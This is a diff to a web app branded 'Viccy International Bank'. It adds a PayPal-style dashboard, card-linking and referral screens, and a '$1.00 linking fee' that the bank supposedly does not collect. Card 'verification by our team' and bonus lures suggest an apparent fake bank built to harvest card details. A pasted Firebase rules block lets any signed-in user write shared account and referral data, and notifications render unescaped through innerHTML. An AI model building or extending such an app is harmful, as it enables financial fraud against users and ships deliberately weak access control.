@@ -10,27 +10,23 @@
 /* ── Global scroll fix — no horizontal overflow ── */
 html,body{overflow-x:hidden;width:100%;max-width:100%;}
 *{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f4f8;color:#111;min-height:100vh;}
 
 /* ── Auth screen — iPhone fix: full scroll, no content stuck ── */
 #auth-screen{
   min-height:100vh;
   min-height:-webkit-fill-available;
-  display:flex;
-  flex-direction:column;
-  justify-content:flex-start;
-  padding:20px 20px 60px;
   overflow-y:auto;
   -webkit-overflow-scrolling:touch;
 }
 .language-selector{position:fixed;bottom:90px;right:16px;width:40px;height:40px;background:rgba(0,37,90,0.9);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:998;font-size:20px;border:1px solid rgba(255,255,255,0.2);transition:all 0.3s;box-shadow:0 4px 12px rgba(0,0,0,0.4);}
 .language-selector:hover{background:rgba(0,60,140,0.9);transform:scale(1.1);}
 .form-section{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin:12px 0;max-width:400px;width:100%;margin-left:auto;margin-right:auto;}
-input,select,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;}
-input,select{background:rgba(255,255,255,0.12);color:#fff;}
-input::placeholder{color:rgba(255,255,255,0.5);}
-select option{background:#0a2540;color:#fff;}
-button{background:#0055ff;color:white;font-weight:bold;cursor:pointer;transition:background 0.2s;}
+input,select,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;box-sizing:border-box;}
+input,select{background:#f0f4f8;color:#111;border:1.5px solid #e0e8f0;}
+input::placeholder{color:#aab;}
+select option{background:#fff;color:#111;}
+button{background:#1a56ff;color:white;font-weight:bold;cursor:pointer;transition:background 0.2s;font-family:inherit;}
 button:hover{background:#0044dd;}
 .toggle-link{
   display:block;
@@ -460,6 +456,212 @@ button:hover{background:#0044dd;}
 .codes-pin-row input{flex:1;margin:0;}
 .codes-pin-row button{width:auto;margin:0;padding:10px 16px;white-space:nowrap;}
 
+/* ══════════════════════════════════════════════
+   PAYPAL-STYLE DASHBOARD
+══════════════════════════════════════════════ */
+#dashboard{background:#f0f4f8;min-height:100vh;padding:0;overflow-x:hidden;}
+
+/* Tab pages */
+.tab-page{display:none;min-height:100vh;}
+.tab-page.active-tab{display:block;}
+
+/* Top bar */
+.pp-topbar{background:#fff;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #e8edf2;position:sticky;top:0;z-index:100;}
+.pp-menu-btn{background:none;border:none;font-size:22px;cursor:pointer;color:#333;padding:4px;width:auto;margin:0;}
+.pp-topbar-title{font-size:18px;font-weight:700;color:#111;}
+.pp-topbar-right{display:flex;align-items:center;gap:8px;}
+.pp-topbar-right .notif-bell{font-size:20px;cursor:pointer;}
+
+/* Balance card */
+.pp-balance-card{background:#fff;margin:12px 16px;border-radius:16px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,0.08);}
+.pp-balance-label{font-size:13px;color:#666;margin-bottom:6px;display:flex;align-items:center;gap:8px;}
+.pp-acct-num{background:#eef2ff;color:#1a56ff;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:600;}
+.pp-balance-amount{font-size:42px;font-weight:800;color:#111;letter-spacing:-1px;margin-bottom:2px;}
+.pp-balance-sub{font-size:12px;color:#999;margin-bottom:16px;}
+.pp-balance-actions{display:flex;gap:8px;}
+.pp-action-btn{flex:1;display:flex;flex-direction:column;align-items:center;gap:4px;background:#f0f4f8;border:none;border-radius:12px;padding:12px 6px;cursor:pointer;font-size:12px;color:#333;font-weight:500;font-family:inherit;}
+.pp-action-btn:active{background:#e0e8f0;}
+.pp-action-icon{font-size:20px;}
+
+/* Sections */
+.pp-section{padding:0 16px;margin-top:16px;}
+.pp-section-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
+.pp-section-title{font-size:17px;font-weight:700;color:#111;}
+.pp-add-new-btn{background:none;border:none;color:#1a56ff;font-size:14px;font-weight:600;cursor:pointer;padding:0;width:auto;margin:0;}
+
+/* Linked card tiles */
+.pp-card-tile{background:#fff;border-radius:14px;padding:0;margin-bottom:10px;overflow:hidden;box-shadow:0 1px 6px rgba(0,0,0,0.08);display:flex;align-items:stretch;}
+.pp-card-tile-color{width:6px;flex-shrink:0;}
+.pp-card-tile-body{flex:1;padding:14px 16px;}
+.pp-card-tile-top{display:flex;justify-content:space-between;align-items:center;}
+.pp-card-brand{font-size:15px;font-weight:700;color:#111;}
+.pp-card-num{font-size:13px;color:#666;margin-top:2px;}
+.pp-card-status-badge{font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;}
+.pp-card-status-badge.authorized{background:#e6faf0;color:#00a550;}
+.pp-card-status-badge.pending{background:#fff8e6;color:#e6a817;}
+.pp-card-status-badge.checking{background:#eef2ff;color:#1a56ff;}
+.pp-card-tile-actions{display:flex;gap:8px;margin-top:10px;}
+.pp-card-remove-btn{background:none;border:1px solid #ffcdd2;color:#e53935;padding:5px 14px;border-radius:8px;font-size:12px;cursor:pointer;width:auto;margin:0;}
+
+/* Bottom nav */
+.pp-bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #e8edf2;display:flex;justify-content:space-around;padding:8px 0 calc(8px + env(safe-area-inset-bottom));z-index:200;box-shadow:0 -2px 12px rgba(0,0,0,0.06);}
+.pp-nav-btn{background:none;border:none;display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;padding:4px 8px;font-family:inherit;width:auto;margin:0;min-width:60px;}
+.pp-nav-icon{font-size:20px;}
+.pp-nav-label{font-size:10px;color:#666;font-weight:500;}
+.pp-nav-btn.active .pp-nav-label{color:#1a56ff;}
+.pp-nav-btn.active .pp-nav-icon{filter:none;}
+.pp-nav-center{position:relative;}
+.pp-nav-center-icon{background:#111;color:#fff;border-radius:50%;width:48px;height:48px;display:flex;align-items:center;justify-content:center;font-size:20px;margin-top:-20px;box-shadow:0 4px 12px rgba(0,0,0,0.25);}
+
+/* Send/Request tab */
+.pp-sr-body{padding:16px;display:grid;gap:16px;padding-bottom:100px;}
+.pp-sr-card{background:#fff;border-radius:16px;padding:20px;box-shadow:0 1px 6px rgba(0,0,0,0.08);}
+.pp-sr-label{font-size:16px;font-weight:700;color:#111;margin-bottom:14px;}
+.pp-sr-input{width:100%;border:1px solid #e0e0e0;background:#f8fafc;color:#111;border-radius:10px;padding:12px 14px;font-size:14px;margin-bottom:10px;box-sizing:border-box;font-family:inherit;}
+.pp-sr-input:focus{border-color:#1a56ff;outline:none;background:#fff;}
+.pp-sr-info{background:#eef2ff;border-radius:8px;padding:10px 14px;font-size:13px;color:#1a56ff;margin-bottom:10px;font-weight:600;}
+.pp-sr-send-btn,.pp-sr-req-btn{width:100%;background:#111;color:#fff;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin:0;}
+.pp-sr-req-btn{background:#1a56ff;}
+
+/* Offers tab */
+.pp-offers-body{padding:16px;display:grid;gap:14px;padding-bottom:100px;}
+.pp-offer-card{background:#fff;border-radius:16px;padding:20px;box-shadow:0 1px 6px rgba(0,0,0,0.08);}
+.pp-offer-icon{font-size:36px;margin-bottom:10px;}
+.pp-offer-title{font-size:16px;font-weight:700;color:#111;margin-bottom:6px;}
+.pp-offer-desc{font-size:13px;color:#555;line-height:1.5;margin-bottom:14px;}
+.pp-offer-cta{background:#1a56ff;color:#fff;border:none;border-radius:10px;padding:12px 24px;font-size:14px;font-weight:700;cursor:pointer;width:auto;margin:0;}
+
+/* Side drawer menu */
+.pp-drawer{position:fixed;top:0;left:-280px;width:280px;height:100vh;background:#fff;z-index:999;transition:left 0.3s ease;box-shadow:4px 0 24px rgba(0,0,0,0.15);overflow-y:auto;}
+.pp-drawer.open{left:0;}
+.pp-drawer-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:998;display:none;}
+.pp-drawer-overlay.open{display:block;}
+.pp-drawer-header{background:#111;padding:40px 20px 20px;color:#fff;}
+.pp-drawer-name{font-size:18px;font-weight:700;}
+.pp-drawer-email{font-size:12px;opacity:0.7;margin-top:4px;}
+.pp-drawer-item{display:flex;align-items:center;gap:14px;padding:16px 20px;border-bottom:1px solid #f0f0f0;font-size:15px;color:#333;cursor:pointer;}
+.pp-drawer-item:hover{background:#f8fafc;}
+.pp-drawer-item-icon{font-size:20px;width:28px;text-align:center;}
+.pp-drawer-logout{color:#e53935;}
+
+/* Transactions in light theme */
+.transactions-container .history-item{background:#fff;border-radius:12px;padding:14px 16px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
+.history-amount.credit{color:#00a550;}
+.history-amount.debit{color:#e53935;}
+.history-date{font-size:11px;color:#999;}
+.history-type{font-size:14px;color:#111;font-weight:500;}
+
+/* Add money modal */
+.pp-addmoney-opts{display:grid;gap:12px;margin-top:4px;}
+.pp-addmoney-opt{display:flex;align-items:center;gap:14px;background:#f8fafc;border:2px solid #e0e8f0;border-radius:12px;padding:14px 16px;cursor:pointer;transition:border-color 0.2s;}
+.pp-addmoney-opt.selected,.pp-addmoney-opt:hover{border-color:#1a56ff;background:#eef2ff;}
+.pp-addmoney-opt-icon{font-size:24px;}
+.pp-addmoney-opt-label{font-size:14px;font-weight:600;color:#111;}
+.pp-addmoney-opt-sub{font-size:12px;color:#666;}
+
+/* Override modal for light theme */
+.modal{background:rgba(0,0,0,0.5);}
+.modal-content{background:#fff;color:#111;}
+.modal-header h3{color:#111;}
+.close-btn{color:#333;}
+
+/* Auth screen stays dark */
+#auth-screen{
+  background:#f0f4f8;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:flex-start;
+  padding:40px 20px 40px;
+  box-sizing:border-box;
+}
+#auth-screen .form-section{
+  background:#fff;
+  border-radius:20px;
+  padding:28px 24px;
+  width:100%;
+  max-width:400px;
+  box-shadow:0 4px 20px rgba(0,0,0,0.08);
+  border:none;
+}
+#auth-screen h2{
+  color:#111;
+  font-size:24px;
+  font-weight:800;
+  margin:0 0 20px;
+  text-align:center;
+}
+#auth-screen input,
+#auth-screen select{
+  background:#f0f4f8;
+  color:#111;
+  border:1.5px solid #e0e8f0;
+  border-radius:10px;
+  padding:13px 14px;
+  font-size:15px;
+  width:100%;
+  box-sizing:border-box;
+  margin:6px 0;
+  font-family:inherit;
+  -webkit-appearance:none;
+}
+#auth-screen input:focus,
+#auth-screen select:focus{
+  border-color:#1a56ff;
+  outline:none;
+  background:#fff;
+}
+#auth-screen input::placeholder{color:#aab;}
+#auth-screen select option{background:#fff;color:#111;}
+#auth-screen button[type="submit"]{
+  background:#1a56ff !important;
+  color:#fff !important;
+  border:none !important;
+  border-radius:12px !important;
+  padding:15px !important;
+  font-size:16px !important;
+  font-weight:700 !important;
+  width:100% !important;
+  cursor:pointer !important;
+  margin-top:10px !important;
+  box-shadow:0 4px 14px rgba(26,86,255,0.3);
+  font-family:inherit !important;
+  display:block !important;
+}
+#auth-screen button[type="submit"]:active{background:#0040cc !important;}
+#auth-screen .toggle-link{
+  color:#1a56ff;
+  background:none;
+  border:none;
+  width:100%;
+  text-align:center;
+  margin-top:16px;
+  font-size:14px;
+  cursor:pointer;
+  padding:8px;
+  display:block;
+}
+#auth-screen .error{color:#e53935;font-size:13px;text-align:center;margin:6px 0;}
+#auth-screen label{color:#555;}
+
+/* Auth screen logo/header */
+.auth-logo{text-align:center;margin-bottom:24px;}
+.auth-logo-icon{font-size:48px;display:block;margin-bottom:8px;}
+.auth-logo-name{font-size:22px;font-weight:800;color:#111;letter-spacing:-0.5px;}
+.auth-logo-sub{font-size:13px;color:#888;margin-top:2px;}
+
+/* Top-right notification bell */
+.pp-notif-topbtn{position:relative;background:none;border:none;font-size:22px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;padding:0;margin:0;border-radius:50%;}
+.pp-notif-topbtn:active{background:#f0f0f0;}
+#nav-notif-badge{position:absolute;top:2px;right:2px;background:#e53935;color:#fff;font-size:9px;font-weight:800;min-width:16px;height:16px;border-radius:8px;padding:0 4px;display:none;align-items:center;justify-content:center;line-height:16px;text-align:center;box-sizing:border-box;}
+
+/* Admin panel stays dark */
+#admin-panel{background:linear-gradient(180deg,#0a2540,#001022);color:#fff;}
+#admin-panel input,#admin-panel select,#admin-panel textarea{background:rgba(255,255,255,0.12);color:#fff;border:1px solid rgba(255,255,255,0.2);}
+#admin-panel input::placeholder,#admin-panel textarea::placeholder{color:rgba(255,255,255,0.4);}
+#admin-panel select option{background:#0a2540;color:#fff;}
+
 </style>
 </head>
 <body>
@@ -468,6 +670,12 @@ button:hover{background:#0044dd;}
 
 <!-- AUTH SCREEN -->
 <div id="auth-screen">
+  <div class="auth-logo">
+    <span class="auth-logo-icon">🏦</span>
+    <div class="auth-logo-name">Viccy International Bank</div>
+    <div class="auth-logo-sub">Secure Banking</div>
+  </div>
+
   <div id="signup-section" class="form-section">
     <h2 data-translate="createAccount">Create Account</h2>
     <form id="signup-form">
@@ -517,61 +725,188 @@ button:hover{background:#0044dd;}
 
 <!-- DASHBOARD -->
 <div id="dashboard" style="display:none;">
-  <!-- Top bar: notification bell (left) + username (centre) -->
-  <div class="top-bar">
-    <div class="notif-bell" id="notif-bell-btn">
-      🔔
-      <span class="notif-dot" id="notif-dot" style="display:none;"></span>
-    </div>
-    <div id="username-display" class="username-display">User</div>
-    <div style="width:44px;"></div><!-- spacer to centre username -->
-  </div>
 
-  <!-- Verify banner — shown until user has a verified card -->
-  <div id="verify-banner" class="verify-banner" style="display:none;">
-    🔐 <strong>Verify your account</strong> — Link a bank card to unlock full access &amp; earn a $10 bonus!
-    <button class="verify-banner-btn" id="verify-banner-btn">Verify Now</button>
-  </div>
+  <!-- ── TAB PAGES ── -->
+  <div id="tab-accounts" class="tab-page active-tab">
 
-  <div class="header" style="margin-top:0;">
-    <div class="balance-card">
-      <div class="card-number" id="card-number">**** *** ***</div>
-      <div class="card-balance">
-        <span id="currency-symbol">$</span><span id="balance">0.00</span>
-      </div>
-      <div class="card-balance-label" data-translate="availableBalance">Available Balance</div>
-    </div>
-    <button class="accounts-btn" data-translate="accounts">Accounts</button>
-  </div>
-
-  <div class="nav-section">
-    <div class="bottom-nav">
-      <div class="nav-item" id="withdraw-btn">
-        <div>↓</div>
-        <div class="nav-label" data-translate="withdraw">Withdraw</div>
-      </div>
-      <div class="nav-item" id="send-btn">
-        <div>→</div>
-        <div class="nav-label" data-translate="send">Send</div>
-      </div>
-      <div class="nav-item" id="add-card-btn">
-        <div>💳</div>
-        <div class="nav-label" data-translate="addCard">Add Card</div>
-      </div>
-      <div class="nav-item" id="refer-btn">
-        <div>🎁</div>
-        <div class="nav-label">Refer</div>
-      </div>
-      <div class="nav-item" id="more-btn">
-        <div>⋯</div>
-        <div class="nav-label" data-translate="more">More</div>
+    <!-- TOP BAR -->
+    <div class="pp-topbar">
+      <button class="pp-menu-btn" id="pp-menu-btn">☰</button>
+      <span class="pp-topbar-title">Accounts</span>
+      <div class="pp-topbar-right">
+        <button class="pp-notif-topbtn" id="notif-bell-btn">
+          🔔
+          <span id="nav-notif-badge" style="display:none;">0</span>
+        </button>
       </div>
     </div>
+
+    <!-- Verify banner -->
+    <div id="verify-banner" class="verify-banner" style="display:none;">
+      🔐 <strong>Verify your account</strong> — Link a card &amp; earn a bonus!
+      <button class="verify-banner-btn" id="verify-banner-btn">Verify Now</button>
+    </div>
+
+    <!-- BALANCE CARD -->
+    <div class="pp-balance-card">
+      <div class="pp-balance-label">Viccy Bank balance &nbsp;<span class="pp-acct-num" id="card-number">•• 0000</span></div>
+      <div class="pp-balance-amount"><span id="currency-symbol">$</span><span id="balance">0.00</span></div>
+      <div class="pp-balance-sub">Available balance</div>
+      <div class="pp-balance-actions">
+        <button class="pp-action-btn" id="add-money-btn">
+          <span class="pp-action-icon">＋</span>Add money
+        </button>
+        <button class="pp-action-btn" id="withdraw-btn">
+          <span class="pp-action-icon">⇄</span>Transfer
+        </button>
+        <button class="pp-action-btn" id="acct-info-btn">
+          <span class="pp-action-icon">ⓘ</span>Account info
+        </button>
+      </div>
+    </div>
+
+    <!-- LINKED BANKS AND CARDS -->
+    <div class="pp-section">
+      <div class="pp-section-header">
+        <span class="pp-section-title">Linked cards</span>
+        <button class="pp-add-new-btn" id="add-card-btn">Add New ›</button>
+      </div>
+      <div id="pp-card-list"></div>
+    </div>
+
+    <!-- RECENT TRANSACTIONS -->
+    <div class="pp-section" style="padding-bottom:100px;">
+      <div class="pp-section-header">
+        <span class="pp-section-title">Recent transactions</span>
+      </div>
+      <div class="transactions-container" id="transactions-container"></div>
+    </div>
+  </div><!-- end tab-accounts -->
+
+  <!-- ── RECEIPT TAB ── -->
+  <div id="tab-receipt" class="tab-page">
+    <div class="pp-topbar"><span class="pp-topbar-title">Receipts</span></div>
+    <div class="pp-section" style="padding-bottom:100px;">
+      <div class="transactions-container" id="receipt-container"></div>
+    </div>
   </div>
 
-  <div>
-    <h3 class="section-title" data-translate="recentTransactions">Recent Transactions</h3>
-    <div class="transactions-container" id="transactions-container"></div>
+  <!-- ── SEND/REQUEST TAB ── -->
+  <div id="tab-sendreq" class="tab-page">
+    <div class="pp-topbar"><span class="pp-topbar-title">Send / Request</span></div>
+    <div class="pp-sr-body">
+      <!-- SEND -->
+      <div class="pp-sr-card" id="pp-send-panel">
+        <div class="pp-sr-label">Send Money</div>
+        <input type="text" id="sr-recipient" placeholder="Recipient account (10 digits)" maxlength="10" class="pp-sr-input">
+        <div id="sr-recipient-info" style="display:none;" class="pp-sr-info"></div>
+        <input type="number" id="sr-amount" placeholder="Amount" class="pp-sr-input" min="0.01" step="0.01">
+        <input type="text" id="sr-pin" placeholder="4-digit PIN" maxlength="4" class="pp-sr-input pin-input">
+        <p class="error" id="sr-send-error"></p>
+        <button class="pp-sr-send-btn" id="sr-send-btn">Send</button>
+      </div>
+      <!-- REQUEST -->
+      <div class="pp-sr-card" id="pp-request-panel">
+        <div class="pp-sr-label">Request Money</div>
+        <input type="text" id="rq-account" placeholder="Account number to request from" maxlength="10" class="pp-sr-input">
+        <div id="rq-user-info" style="display:none;" class="pp-sr-info"></div>
+        <input type="number" id="rq-amount" placeholder="Amount to request" class="pp-sr-input" min="0.01" step="0.01">
+        <input type="text" id="rq-note" placeholder="Note (optional)" class="pp-sr-input">
+        <p class="error" id="rq-error"></p>
+        <button class="pp-sr-req-btn" id="rq-send-btn">Request</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── OFFERS TAB ── -->
+  <div id="tab-offers" class="tab-page">
+    <div class="pp-topbar"><span class="pp-topbar-title">Offers</span></div>
+    <div class="pp-offers-body">
+      <div class="pp-offer-card">
+        <div class="pp-offer-icon">💳</div>
+        <div class="pp-offer-title">Link &amp; Verify a Card</div>
+        <div class="pp-offer-desc">Add your bank card and get it verified by our team to earn a <strong id="offer-bonus-label">$10</strong> welcome bonus credited to your balance.</div>
+        <button class="pp-offer-cta" id="offer-add-card-btn">Add Card Now</button>
+      </div>
+      <div class="pp-offer-card" id="offers-refer-card" onclick="document.getElementById('refer-modal').style.display='flex'" style="cursor:pointer;">
+        <div class="pp-offer-icon">🎁</div>
+        <div class="pp-offer-title">Refer &amp; Earn</div>
+        <div class="pp-offer-desc">Invite friends with your referral code. Earn <strong>$10</strong> per referral — claim when you hit 12 referrals.</div>
+        <button class="pp-offer-cta">View My Code</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── BOTTOM NAV ── -->
+  <div class="pp-bottom-nav">
+    <button class="pp-nav-btn active" data-tab="tab-accounts" onclick="switchTab('tab-accounts',this)">
+      <span class="pp-nav-icon">🏠</span>
+      <span class="pp-nav-label">Accounts</span>
+    </button>
+    <button class="pp-nav-btn" data-tab="tab-receipt" onclick="switchTab('tab-receipt',this)">
+      <span class="pp-nav-icon">🧾</span>
+      <span class="pp-nav-label">Receipts</span>
+    </button>
+    <button class="pp-nav-btn pp-nav-center" data-tab="tab-sendreq" onclick="switchTab('tab-sendreq',this)">
+      <span class="pp-nav-center-icon">⇅</span>
+      <span class="pp-nav-label">Send / Request</span>
+    </button>
+    <button class="pp-nav-btn" data-tab="tab-offers" onclick="switchTab('tab-offers',this)">
+      <span class="pp-nav-icon">🏷️</span>
+      <span class="pp-nav-label">Offers</span>
+    </button>
+    <button class="pp-nav-btn" id="refer-btn" onclick="openReferModal()">
+      <span class="pp-nav-icon">🎁</span>
+      <span class="pp-nav-label">Refer</span>
+    </button>
+  </div>
+
+</div>
+
+<!-- SIDE DRAWER -->
+<div class="pp-drawer-overlay" id="drawer-overlay" onclick="closeDrawer()"></div>
+<div class="pp-drawer" id="pp-drawer">
+  <div class="pp-drawer-header">
+    <div class="pp-drawer-name" id="drawer-username">User</div>
+    <div class="pp-drawer-email" id="drawer-email"></div>
+  </div>
+  <div class="pp-drawer-item" onclick="document.getElementById('account-modal').style.display='flex';closeDrawer()">
+    <span class="pp-drawer-item-icon">👤</span> Account Info
+  </div>
+  <div class="pp-drawer-item" onclick="document.getElementById('card-options-modal').style.display='flex';closeDrawer()">
+    <span class="pp-drawer-item-icon">💳</span> Link a Card
+  </div>
+  <div class="pp-drawer-item" onclick="openReferModal();closeDrawer()">
+    <span class="pp-drawer-item-icon">🎁</span> Refer &amp; Earn
+  </div>
+  <div class="pp-drawer-item" onclick="document.getElementById('notif-modal').style.display='flex';closeDrawer()">
+    <span class="pp-drawer-item-icon">🔔</span> Notifications
+  </div>
+  <div class="pp-drawer-item" onclick="document.getElementById('language-modal').style.display='flex';closeDrawer()">
+    <span class="pp-drawer-item-icon">🌐</span> Language
+  </div>
+  <div class="pp-drawer-item pp-drawer-logout" id="drawer-logout-btn">
+    <span class="pp-drawer-item-icon">🚪</span> Log Out
+  </div>
+</div>
+
+<!-- ADD MONEY MODAL -->
+<div id="add-money-modal" class="modal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h3>Add Money</h3>
+      <button id="close-add-money" class="close-btn">×</button>
+    </div>
+    <div class="pp-addmoney-opts" id="addmoney-source-list">
+      <!-- populated by JS -->
+    </div>
+    <div id="addmoney-amount-section" style="display:none;margin-top:16px;">
+      <div id="addmoney-selected-card-info" style="margin-bottom:12px;padding:12px;background:#eef2ff;border-radius:10px;font-size:13px;color:#1a56ff;font-weight:600;"></div>
+      <input type="number" id="addmoney-amount" placeholder="Amount to add" class="pp-sr-input" min="1" step="0.01">
+      <input type="text" id="addmoney-pin" placeholder="4-digit PIN" class="pp-sr-input pin-input" maxlength="4">
+      <p class="error" id="addmoney-error"></p>
+      <button class="pp-sr-send-btn" id="addmoney-confirm-btn">Confirm</button>
+    </div>
   </div>
 </div>
 
@@ -727,6 +1062,10 @@ button:hover{background:#0044dd;}
         </div>
       </div>
       <p class="error" id="card-error"></p>
+      <div style="background:#fff8e6;border:1px solid #ffc107;border-radius:10px;padding:12px 14px;margin-bottom:12px;font-size:13px;color:#7a5200;display:flex;gap:10px;align-items:flex-start;">
+        <span style="font-size:18px;">💳</span>
+        <div><strong>$1.00 linking fee</strong><br>A one-time charge of $1 will be applied to verify your card is active. This amount is not collected by Viccy Bank and is simply used to confirm the card works.</div>
+      </div>
       <button type="submit" data-translate="linkCard">Link Card</button>
     </form>
   </div>
@@ -927,6 +1266,37 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/fireba
 import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
 import { getDatabase, ref, set, get, runTransaction, onValue } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
+/*
+  ══════════════════════════════════════════════
+  FIREBASE DATABASE RULES — paste these in your
+  Firebase Console → Realtime Database → Rules
+  to remove the expiry warning permanently:
+  ══════════════════════════════════════════════
+  {
+    "rules": {
+      "users": {
+        "$uid": {
+          ".read": "$uid === auth.uid || auth.token.email === 'admin@gmail.com'",
+          ".write": "$uid === auth.uid || auth.token.email === 'admin@gmail.com'"
+        }
+      },
+      "accountNumbers": {
+        ".read": "auth != null",
+        ".write": "auth != null"
+      },
+      "notifications": {
+        "$uid": {
+          ".read": "$uid === auth.uid || auth.token.email === 'admin@gmail.com'",
+          ".write": "auth != null"
+        }
+      },
+      "referralCodes": {
+        ".read": "auth != null",
+        ".write": "auth != null"
+      }
+    }
+  }
+*/
 const firebaseConfig = {
   apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",
   authDomain:"viccybank.firebaseapp.com",
@@ -1998,6 +2368,8 @@ onAuthStateChanged(auth,user=>{
 
       updateHistory(d.history||[]);
       updateVerifyBanner(d);
+      renderPPCards(d);
+      updateDrawerInfo(d);
     });
 
     listenNotifications(user.uid);
@@ -2846,48 +3218,6 @@ function showLocalNotif(title,body){
 // ============================================================
 // NOTIFICATIONS — real-time inbox from Firebase
 // ============================================================
-let unreadCount=0;
-
-window.listenNotifications=function(uid){
-  const nRef=ref(db,'notifications/'+uid);
-  onValue(nRef,snap=>{
-    const all=[];
-    snap.forEach(child=>{all.push({id:child.key,...child.val()});});
-    unreadCount=all.filter(n=>!n.read).length;
-    const dot=document.getElementById('notif-dot');
-    if(dot)dot.style.display=unreadCount>0?'block':'none';
-    renderNotifications(all,uid);
-    // Show push for newest unread
-    if(unreadCount>0){
-      const newest=all.filter(n=>!n.read).slice(-1)[0];
-      if(newest)showLocalNotif('Viccy Bank',newest.message);
-    }
-  });
-}
-
-window.renderNotifications=function(notifs,uid){
-  const list=document.getElementById('notif-list');
-  if(!list)return;
-  if(!notifs.length){
-    list.innerHTML='<p style="text-align:center;opacity:0.6;padding:20px;">No notifications</p>';
-    return;
-  }
-  list.innerHTML='';
-  notifs.slice().reverse().forEach(n=>{
-    const item=document.createElement('div');
-    item.className='notif-item'+(n.read?'':' notif-unread');
-    item.innerHTML=`
-      <div class="notif-msg">${n.message||''}</div>
-      <div class="notif-time">${formatDate(n.date)}</div>
-    `;
-    item.onclick=async()=>{
-      if(!n.read){
-        await set(ref(db,'notifications/'+uid+'/'+n.id+'/read'),true);
-      }
-    };
-    list.appendChild(item);
-  });
-}
 
 document.getElementById('notif-bell-btn').onclick=async()=>{
   document.getElementById('notif-modal').style.display='flex';
@@ -2940,11 +3270,12 @@ window.loadReferralData=async function(uid,userData){
   }
 }
 
-document.getElementById('refer-btn').onclick=async()=>{
+window.openReferModal=async function(){
   const ud=await get(userDataRef).then(s=>s.val());
   await loadReferralData(currentUser.uid,ud);
   document.getElementById('refer-modal').style.display='flex';
 };
+document.getElementById('refer-btn').onclick=openReferModal;
 document.getElementById('close-refer').onclick=()=>{
   document.getElementById('refer-modal').style.display='none';
 };
@@ -3071,29 +3402,18 @@ window.listenNotifications=function(uid){
     const all=[];
     snap.forEach(child=>{all.push({id:child.key,...child.val()});});
     const unread=all.filter(n=>!n.read).length;
-    const dot=document.getElementById('notif-dot');
-    if(dot)dot.style.display=unread>0?'block':'none';
+    const badge=document.getElementById('nav-notif-badge');
+    if(badge){
+      if(unread>0){badge.textContent=unread>99?'99+':unread;badge.style.display='inline-flex';}
+      else{badge.style.display='none';}
+    }
     renderNotifications(all,uid);
     if(unread>0){
       const newest=all.filter(n=>!n.read).pop();
       if(newest)showLocalNotif('Viccy Bank',newest.message);
     }
   });
-}
-
-window.renderNotifications=function(notifs,uid){
-  const list=document.getElementById('notif-list');
-  if(!list)return;
-  if(!notifs.length){list.innerHTML='<p style="text-align:center;opacity:0.6;padding:20px;">No notifications</p>';return;}
-  list.innerHTML='';
-  notifs.slice().reverse().forEach(n=>{
-    const item=document.createElement('div');
-    item.className='notif-item'+(n.read?'':' notif-unread');
-    item.innerHTML=`<div class="notif-msg">${n.message||''}</div><div class="notif-time">${formatDate(n.date)}</div>`;
-    item.onclick=async()=>{if(!n.read)await set(ref(db,'notifications/'+uid+'/'+n.id+'/read'),true);};
-    list.appendChild(item);
-  });
-}
+};
 
 // ============================================================
 // TOGGLE ACCORDION
@@ -3523,6 +3843,260 @@ document.getElementById('admin-change-all-btn').onclick=async()=>{
     loadCodesTab();
   }
 };
+
+// ============================================================
+// TAB SWITCHING
+// ============================================================
+window.switchTab=function(tabId,btn){
+  document.querySelectorAll('.tab-page').forEach(p=>p.classList.remove('active-tab'));
+  document.querySelectorAll('.pp-nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById(tabId).classList.add('active-tab');
+  if(btn)btn.classList.add('active');
+  if(tabId==='tab-receipt'){
+    const rc=document.getElementById('receipt-container');
+    const tc=document.getElementById('transactions-container');
+    if(rc&&tc)rc.innerHTML=tc.innerHTML;
+  }
+};
+
+// ============================================================
+// SIDE DRAWER
+// ============================================================
+window.closeDrawer=function(){
+  document.getElementById('pp-drawer').classList.remove('open');
+  document.getElementById('drawer-overlay').classList.remove('open');
+};
+document.getElementById('pp-menu-btn').onclick=function(){
+  document.getElementById('pp-drawer').classList.add('open');
+  document.getElementById('drawer-overlay').classList.add('open');
+};
+document.getElementById('drawer-logout-btn').onclick=()=>signOut(auth);
+
+// ============================================================
+// RENDER PP CARD LIST
+// ============================================================
+function renderPPCards(userData){
+  const list=document.getElementById('pp-card-list');
+  if(!list)return;
+  const cards=(userData.linkedCards||[]).filter(c=>c.status!=='rejected');
+  list.innerHTML='';
+  if(!cards.length){
